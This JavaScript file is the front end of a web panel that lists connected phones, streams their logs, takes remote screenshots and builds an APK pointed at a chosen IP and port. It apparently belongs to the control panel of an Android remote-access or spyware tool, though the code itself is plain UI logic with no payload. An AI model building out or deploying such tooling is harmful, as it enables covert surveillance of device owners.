const devices = document.getElementById("devices")
const infos = document.getElementById("infos")
const form = document.getElementById("left")
const msgs = document.getElementById("msgs")
const output = document.getElementById("output")
const ipInput = document.getElementById('ipInput')
const portInput = document.getElementById('portInput')

let currentDevice = ""
let previousDevice = ""
let currentDeviceConnected = false

document.querySelectorAll("form").forEach(e => {
    e.addEventListener("submit", i => i.preventDefault())
});

/* Clearing */
// form.reset()
infos.innerHTML = '<div class="info">    <span>Brand :</span>    <span>--</span></div><div class="info">    <span>Model :</span>    <span>--</span></div><div class="info">    <span>Manufacture :</span>    <span>--</span></div><div class="device-action"><div class="screenshot-button" onclick="takeScreenshot()" title="Take Screenshot"><img src="../img/screenshot.png" alt="Take Screenshot"><span>Take Screenshot</span></div></div>';

async function getInfo(id) {
    previousDevice = currentDevice;
    if (id != "None") {
        socket.emit("get_device_info", id);
    } else {
        currentDevice = ""
        previousDevice = "";
        currentDeviceConnected = false;
        infos.innerHTML = '<div class="info">    <span>Brand :</span>    <span>--</span></div><div class="info">    <span>Model :</span>    <span>--</span></div><div class="info">    <span>Manufacture :</span>    <span>--</span></div><div class="device-action"><div class="screenshot-button" onclick="takeScreenshot()" title="Take Screenshot"><img src="../img/screenshot.png" alt="Take Screenshot"><span>Take Screenshot</span></div></div>'
        updateScreenshotButton()
        output.value = "";
        updateScreenshotButton();
    }
}

/** Making Socket Connections */
const socket = io(`ws://${document.location.hostname}:4001/`, { transports: ['websocket'], upgrade: false })

socket.on("logger", ({ device, log }) => {
    if (device === currentDevice) {
        // console.log(log)
        output.value += log.trim() + "\n";
        output.scrollTop = output.scrollHeight;
    }
})

socket.on("device_logs", (logs) => {
    output.value = logs.join('\n');
    if (output.value) {
        output.scrollTop = output.scrollHeight;
    }
})

socket.on("info", (data) => {
    // console.log(data)
    devices.innerHTML = '<option data-display="Devices">None</option>'
    data.forEach(i => {
        const status = i.connected === false ? " [offline]" : "";
        devices.insertAdjacentHTML("beforeend", `<option value="${i.ID}">${i.Brand} (${i.Model})${status}</option>`)
    })
    // Update nice-select after modifying options
    $("select").niceSelect("update")
    // Update screenshot button state after devices are loaded
    updateScreenshotButton()
})

socket.on("screenshot_ready", (data) => {
    if (data.device_uuid === currentDevice && !modalClosing) {
        const filename = data.filename || 'screenshot.jpg';
        const imageUrl = window.location.origin + '/screenshots/' + filename;
        showScreenshotModal(imageUrl, filename);
    }
});

socket.on("screenshot_error", (data) => {
    if (data.device_uuid === currentDevice) {
        showMsg(`Screenshot error: ${data.error}`);
    }
});

socket.on("device_info", (data) => {
    currentDevice = data.device_uuid || currentDevice;
    currentDeviceConnected = data.connected !== false;
    let tmp = "";
    delete data['ID'];
    for (let i in data) {
        tmp += `<div class="info">
        <span>${i} :</span>
        <span>${data[i]}</span>
    </div>`;
    }
    // Preserve the screenshot button when updating device info
    infos.innerHTML = tmp + '<div class="device-action"><div class="screenshot-button" onclick="takeScreenshot()" title="Take Screenshot"><img src="../img/screenshot.png" alt="Take Screenshot"><span>Take Screenshot</span></div></div>';
    updateScreenshotButton();
    // Fetch existing logs
    socket.emit("get_device_logs", currentDevice);
});

socket.on("device_info_error", (data) => {
    showMsg(`Error getting device info: ${data.error}`);
});

socket.on("build_success", (data) => {
    hideBuildProgress();
    showMsg('Build success');
});

socket.on("build_error", (data) => {
    hideBuildProgress();
    showMsg(data.error || 'Build failed');
});



/** Functions */

function updateScreenshotButton() {
    const screenshotButton = document.querySelector('.screenshot-button');
    console.log('updateScreenshotButton called:', {
        currentDevice,
        currentDeviceConnected,
        screenshotButton: !!screenshotButton
    });

    if (!screenshotButton) {
        console.log('Screenshot button not found!');
        return;
    }

    // Check if no device is selected or device is offline
    const isDisabled = !currentDevice || !currentDeviceConnected;

    if (isDisabled) {
        screenshotButton.classList.add('disabled');
        screenshotButton.title = !currentDevice ? "Please select a device first" : "Device is offline";
        console.log('Button disabled, class added');
    } else {
        screenshotButton.classList.remove('disabled');
        screenshotButton.title = "Take Screenshot";
        console.log('Button enabled, class removed');
    }

}

function takeScreenshot() {
    if (!currentDevice) {
        showMsg("Please select a device first.");
        return;
    }

    if (!currentDeviceConnected) {
        showMsg("Cannot take screenshot: Device is offline.");
        return;
    }

    socket.emit("screenshot_req", currentDevice);
}

function download() {
    var ip = ipInput.value.trim()
    var port = portInput.value.trim()

    try {
        if (ip.length && port.length) {
            showBuildProgress()
            socket.emit("build_request", { ip, port });
        } else {
            showMsg('Please enter both IP/Domain and Port')
        }
    } catch (error) {
        hideBuildProgress()
        showMsg('Build request failed')
    }
}

function downloadLatest() {
    var a = document.createElement('a');
    a.href = window.location.protocol + '//' + window.location.hostname + ':8080/download-apk';
    a.download = 'latest-app-debug.apk';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

function showBuildProgress() {
    const buildButton = document.querySelector('.section-apk-inline');
    const buildButtonText = document.getElementById('buildButtonText');
    const buildProgress = document.getElementById('buildProgress');

    // Disable the build button
    buildButton.style.pointerEvents = 'none';
    buildButton.style.opacity = '0.6';

    // Change button text
    buildButtonText.textContent = 'Building...';

    // Show progress indicator
    buildProgress.style.display = 'block';

    // Add loading animation to progress bar
    const progressFill = buildProgress.querySelector('.progress-fill');
    progressFill.style.width = '0%';
    progressFill.style.transition = 'width 0.3s ease-in-out';

    // Animate progress bar
    setTimeout(() => {
        progressFill.style.width = '100%';
    }, 100);
}

function hideBuildProgress() {
    const buildButton = document.querySelector('.section-apk-inline');
    const buildButtonText = document.getElementById('buildButtonText');
    const buildProgress = document.getElementById('buildProgress');

    // Re-enable the build button
    buildButton.style.pointerEvents = 'auto';
    buildButton.style.opacity = '1';

    // Restore button text
    buildButtonText.textContent = 'Build APK';

    // Hide progress indicator
    buildProgress.style.display = 'none';
}

function showMsg(msg) {
    var pTag = document.createElement("p")
    pTag.className = "msg"
    pTag.innerText = msg
    msgs.insertAdjacentElement("beforeend", pTag)
    setTimeout(() => pTag.remove(), 5000)
}

function showScreenshotModal(imageUrl, filename) {
    // Don't show modal if one is already being closed
    if (modalClosing) {
        return;
    }

    // Remove existing modal if present
    const existingModal = document.querySelector('.screenshot-modal');
    if (existingModal) {
        existingModal.remove();
    }

    // Create modal structure
    const modal = document.createElement('div');
    modal.className = 'screenshot-modal';
    modal.innerHTML = `
        <div class="screenshot-modal-content">
            <button class="screenshot-modal-close" title="Close (Esc)">×</button>
            <img src="${imageUrl}" alt="Screenshot" class="screenshot-modal-image" />
            <button class="screenshot-modal-download" title="Download Screenshot">
                <img src="../img/download.png" alt="Download" />
            </button>
        </div>
    `;

    // Add event listeners with event prevention
    modal.querySelector('.screenshot-modal-close').addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        if (!modalClosing) {
            closeScreenshotModal();
        }
    });

    modal.querySelector('.screenshot-modal-download').addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        downloadScreenshot(imageUrl, filename);
    });

    document.body.appendChild(modal);

    // Close modal when clicking on background
    modal.addEventListener('click', function (e) {
        if (e.target === modal && !modalClosing) {
            closeScreenshotModal();
        }
    });

    // Add escape key listener
    document.addEventListener('keydown', handleScreenshotModalEscape);
}

// Variable to track if modal is being closed
let modalClosing = false;

function closeScreenshotModal() {
    // Prevent multiple simultaneous close operations
    if (modalClosing) {
        return;
    }

    const modal = document.querySelector('.screenshot-modal');
    if (modal && !modalClosing) {
        modalClosing = true;

        // Add hidden class for animation
        modal.classList.add('hidden');

        // Wait for animation to complete before removing
        setTimeout(() => {
            if (modal && modal.parentNode) {
                modal.remove();
            }
            modalClosing = false;
        }, 300);
    }

    // Remove escape key listener
    document.removeEventListener('keydown', handleScreenshotModalEscape);
}

function handleScreenshotModalEscape(e) {
    if (e.key === 'Escape' && !modalClosing) {
        closeScreenshotModal();
    }
}

function downloadScreenshot(imageUrl, filename) {
    const a = document.createElement('a');
    a.href = imageUrl;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

$(document).ready(() => {
    // Initialize nice-select
    $("select").niceSelect()

    // Initialize screenshot button state
    updateScreenshotButton()
})

// Function to reinitialize nice-select if needed
function reinitializeNiceSelect() {
    try {
        $("select").niceSelect("destroy")
        $("select").niceSelect()
        console.log('Nice-select reinitialized successfully')
    } catch (error) {
        console.error('Error reinitializing nice-select:', error)
    }
}
